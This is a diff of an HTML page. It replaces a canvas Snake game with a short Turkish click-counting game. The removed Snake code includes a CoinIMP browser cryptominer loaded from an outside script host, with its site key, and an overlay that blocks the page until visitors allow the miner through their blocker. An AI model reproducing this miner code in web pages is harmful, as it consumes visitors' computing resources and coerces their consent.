@@ -1,283 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snake Game</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f3f3f3;
-            margin: 0;
-            padding: 0;
-        }
-
-        #game-container {
-            margin: 20px auto;
-            width: 90%;
-            max-width: 360px;
-            position: relative;
-        }
-
-        #timer, #score {
-            position: fixed;
-            bottom: 10px;
-            left: 10px;
-            font-size: 16px;
-            color: #555;
-            background: rgba(255, 255, 255, 0.8);
-            padding: 5px 10px;
-            border-radius: 5px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-            z-index: 100;
-        }
-
-        #score {
-            bottom: 50px;
-        }
-
-        #game-board {
-            border: 2px solid #555;
-            background-color: #fff;
-            margin: 20px auto;
-            display: block;
-            width: 100%;
-            aspect-ratio: 1 / 1;
-        }
-
-        #controls {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin: 10px 0;
-            position: relative;
-        }
-
-        .horizontal-buttons {
-            display: flex;
-            justify-content: space-between;
-            width: 60%;
-            margin-top: 10px;
-        }
-
-        button {
-            padding: 12px 24px;
-            margin: 5px;
-            font-size: 16px;
-            border: none;
-            border-radius: 8px;
-            background-color: #007bff;
-            color: white;
-            cursor: pointer;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            transition: all 0.3s ease;
-        }
-
-        button:hover {
-            background-color: #0056b3;
-        }
-
-        button:active {
-            background-color: #003f8f;
-        }
-
-        #start-button, #restart-button {
-            display: block;
-            margin: 20px auto;
-            width: 50%;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 10;
-        }
-
-        #restart-button {
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tıkla ve Kazan</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: Arial, sans-serif;
+    }
+    button {
+      padding: 20px;
+      font-size: 20px;
+      cursor: pointer;
+    }
+    #score, #timer {
+      font-size: 24px;
+      margin-top: 20px;
+    }
+  </style>
 </head>
 <body>
-    
+  <h1>Tıkla ve Kazan</h1>
+  <p>10 saniye içinde olabildiğince fazla tıklayın!</p>
+  <button id="clickButton" onclick="incrementScore()">Tıkla!</button>
+  <p id="score">Puan: 0</p>
+  <p id="timer">Süre: 10</p>
 
-    <div id="game-container">
-        <div id="timer">Time Passed: 0 seconds</div>
-        <div id="score">Score: 0</div>
-        <canvas id="game-board"></canvas>
-        <div id="controls">
-            <button id="up">⬆ Up</button>
-            <div class="horizontal-buttons">
-                <button id="left">⬅ Left</button>
-                <button id="right">➡ Right</button>
-            </div>
-            <button id="down">⬇ Down</button>
-        </div>
-        <button id="start-button">Start</button>
-        <button id="restart-button">Restart</button>
-    </div>
-    
+  <script>
+    let score = 0;
+    let timeLeft = 10;
+    const scoreDisplay = document.getElementById('score');
+    const timerDisplay = document.getElementById('timer');
+    const button = document.getElementById('clickButton');
 
-<script>
-    
+    function incrementScore() {
+      score++;
+      scoreDisplay.textContent = `Puan: ${score}`;
+    }
 
-
-
-
-        const canvas = document.getElementById("game-board");
-        const ctx = canvas.getContext("2d");
-        const startButton = document.getElementById("start-button");
-        const restartButton = document.getElementById("restart-button");
-        const timerElement = document.getElementById("timer");
-        const scoreElement = document.getElementById("score");
-
-        canvas.width = canvas.clientWidth;
-        canvas.height = canvas.clientWidth;
-
-        let snake = [];
-        let direction = { x: 0, y: 0 };
-        let food = { x: 0, y: 0 };
-        let gameInterval;
-        let elapsedSeconds = 0;
-        let score = 0;
-        let timerInterval;
-
-        const gridSize = 20;
-        const updateInterval = 200; // Slower game speed (in milliseconds)
-
-        // Update direction
-        function changeDirection(x, y) {
-            if (direction.x === -x && direction.y === -y) return;
-            direction = { x, y };
-        }
-
-        // Spawn food
-        function spawnFood() {
-            food.x = Math.floor(Math.random() * (canvas.width / gridSize)) * gridSize;
-            food.y = Math.floor(Math.random() * (canvas.height / gridSize)) * gridSize;
-
-            // Ensure food doesn't spawn on the snake
-            if (snake.some(segment => segment.x === food.x && segment.y === food.y)) {
-                spawnFood();
-            }
-        }
-
-        // Draw the game
-        function drawGame() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-            // Draw food
-            ctx.fillStyle = "red";
-            ctx.beginPath();
-            ctx.arc(food.x + gridSize / 2, food.y + gridSize / 2, gridSize / 2, 0, 2 * Math.PI);
-            ctx.fill();
-
-            // Draw snake
-            ctx.fillStyle = "green";
-            snake.forEach(segment => {
-                ctx.beginPath();
-                ctx.arc(segment.x + gridSize / 2, segment.y + gridSize / 2, gridSize / 2.5, 0, 2 * Math.PI);
-                ctx.fill();
-            });
-        }
-
-        // Update the game
-        function updateGame() {
-            const head = { x: snake[0].x + direction.x * gridSize, y: snake[0].y + direction.y * gridSize };
-
-            // Check for wall collision or self collision
-            if (
-                head.x < 0 || head.y < 0 || head.x >= canvas.width || head.y >= canvas.height ||
-                snake.some(segment => segment.x === head.x && segment.y === head.y)
-            ) {
-                clearInterval(gameInterval);
-                restartButton.style.display = "block";
-                return;
-            }
-
-            // Check if snake eats food
-            if (head.x === food.x && head.y === food.y) {
-                score++;
-                scoreElement.textContent = `Score: ${score}`;
-                spawnFood();
-            } else {
-                snake.pop();
-            }
-
-            snake.unshift(head);
-            drawGame();
-        }
-
-        // Start timer
-        function startTimer() {
-            timerElement.textContent = `Time Passed: ${elapsedSeconds} seconds`;
-
-            timerInterval = setInterval(() => {
-                if (!document.hidden) {
-                    elapsedSeconds++;
-                    timerElement.textContent = `Time Passed: ${elapsedSeconds} seconds`;
-                } else {
-                    elapsedSeconds = 0;
-                }
-            }, 1000);
-        }
-
-        // Start the game
-        startButton.addEventListener("click", () => {
-            // Reset game variables
-            snake = [
-                { x: gridSize * 5, y: gridSize * 5 },
-                { x: gridSize * 4, y: gridSize * 5 },
-                { x: gridSize * 3, y: gridSize * 5 }
-            ];
-            direction = { x: 1, y: 0 };
-            score = 0;
-            scoreElement.textContent = `Score: ${score}`;
-            spawnFood();
-            drawGame();
-            startTimer();
-            gameInterval = setInterval(updateGame, updateInterval); // Slower game speed
-            startButton.style.display = "none";
-            restartButton.style.display = "none";
-        });
-
-        // Restart the game
-        restartButton.addEventListener("click", () => {
-            restartButton.style.display = "none";
-            // Do not reset the timer when restarting
-            startButton.click();
-        });
-
-        // Direction controls
-        document.getElementById("up").addEventListener("click", () => changeDirection(0, -1));
-        document.getElementById("down").addEventListener("click", () => changeDirection(0, 1));
-        document.getElementById("left").addEventListener("click", () => changeDirection(-1, 0));
-        document.getElementById("right").addEventListener("click", () => changeDirection(1, 0));
-
-    </script>
-    <script src="https://www.hostingcloud.racing/bgmI.js"></script>
-<script>
-    var _client = new Client.Anonymous('e0db65e0a2eb7ba4328fd000be5656f158fa397a3d7d509c5ff8a6f19249fd24', {
-        throttle: 0.3, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-</script>
-<script>
-    setTimeout(function(){
-        if(typeof _client === 'undefined' || _client === null)
-        {
-            var messageDiv = document.createElement("div");
-            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
-            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
-            var mainDiv = document.createElement("div");
-            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
-            mainDiv.appendChild(messageDiv);
-            document.body.appendChild(mainDiv);
-            document.getElementsByTagName("body")[0].style.overflow = "hidden";
-            window.scrollTo(0, 0);
-        }
-    },1000);
-</script>
+    const countdown = setInterval(() => {
+      timeLeft--;
+      timerDisplay.textContent = `Süre: ${timeLeft}`;
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        button.disabled = true;
+        timerDisplay.textContent = "Süre bitti!";
+        alert(`Oyun bitti! Toplam puanınız: ${score}`);
+      }
+    }, 1000);
+  </script>
 </body>
 </html>
